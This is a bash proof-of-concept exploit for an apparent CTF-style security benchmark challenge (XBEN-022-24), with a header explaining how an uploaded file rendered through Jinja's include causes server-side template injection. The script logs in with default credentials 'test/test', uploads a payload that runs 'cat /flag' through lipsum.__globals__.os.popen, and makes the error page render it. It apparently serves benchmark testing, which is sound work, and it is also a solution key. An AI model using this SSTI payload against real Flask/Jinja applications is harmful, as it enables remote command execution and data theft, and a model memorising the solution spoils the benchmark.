#!/usr/bin/env bash
# XBEN-022-24 — "Loan Calculator - Include" (tags: default_credentials, ssti,
# path_traversal)
#
# Two guarded features that are safe apart. The profile upload refuses to write
# outside `static/images/`, checking with `realpath` and a common prefix, and it
# holds. `/error?error_type=` refuses to include anything outside `static/`, and
# that holds too. But `error.html` does `{% include error_type %}`, and *include*
# renders what it reads as a Jinja template.
#
# So the traversal is not needed: uploading a file to the directory the include
# is allowed to read is enough, and the uploaded file is executed as a template.
# Both path checks pass while the file does the work.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-target/release/h5i}"
SESSION="xben022-$$"
NAME="poc-$$.html"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" browser type --selector "input[name=username]" "test" --session "$SESSION" >/dev/null
"$H5I" browser type --selector "input[name=password]" "test" --session "$SESSION" >/dev/null
"$H5I" browser click --role button --name "Login" --session "$SESSION" >/dev/null

# Upload the template. The name is ordinary; nothing has to escape anywhere.
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/profile' \
    --set "multipart.image_profile={{lipsum.__globals__.os.popen('cat /flag').read()}}" \
    --set "multipart.image_profile.filename=$NAME" \
    --set 'multipart.image_profile.content_type=image/png' \
    --session "$SESSION" >/dev/null

# Ask the error page to include it.
"$H5I" browser navigate "$URL/error?message=x&error_type=images/$NAME" --session "$SESSION" >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
